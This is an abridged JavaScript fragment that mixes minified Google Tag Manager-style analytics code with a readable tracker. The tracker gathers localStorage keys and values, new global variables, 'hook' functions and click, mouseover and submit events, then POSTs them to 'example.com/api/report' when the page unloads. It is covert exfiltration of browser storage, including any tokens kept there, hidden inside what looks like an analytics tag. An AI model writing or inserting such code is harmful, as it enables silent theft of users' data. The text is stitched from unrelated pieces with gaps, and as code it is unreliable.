...
(function () {
  ...
  */
  ...
  function trackLocalStorageChanges() {
    let storedKey = Object.keys(localStorage);
    for (const key of storedKey) {
      if (!window.seenVars.some(seen => seen === key)) {
        const value = localStorage[key];
        window.localStorageChanges[key] = {
          type: typeof value,
          value: value
        };
      }
  ...
  function trackJSHook() {
    for (const prop in window) {
      if (/^hook/.test(prop) && !window.hookCollection.some(hook => hook === prop)) {
        window.hookCollection.push(window[prop]);
      }
    }
  }
  function Ef(a, b) {
  ...
  ii.fe = Number("0") || 0;
  ii.ka = "dataLayer";
  ii.Uj = "ChEI8POGpwYQwKfQoLnu2YWNARIlABhc5uf6U24hkg0wIOaCbWGQQA2bIc+h3FoOFmD/Dm4yhy7MwhoC/ms\x3d";
  var li = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  function catchGlobalVars() {
    window.globalVarChanges = {};
    Object.keys(window).forEach(key => {
      if (!window.seenVars.some(seenVar => seenVar === key)) {
        window.globalVarChanges[key] = window[key];
      }
    });
  }
  ...
  function listenEvents() {
    const events = ['click', 'mouseover', 'submit'];
  ...
  var dD = {};
  function reportData() {
    const reportUrl = "https://example.com/api/report";
    const xhr = new XMLHttpRequest();
    xhr.open("POST", reportUrl);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.onload = () => {
      console.log(`Report status: ${xhr.status}`);
    };
    const dataToReport = {
      localStorageChanges: window.localStorageChanges,
      jsHooks: window.jsHooks,
      globalVarChanges: window.globalVarChanges,
      eventLogs: window.eventLogs
    };
  ...
  window.addEventListener("beforeunload", runTracker);
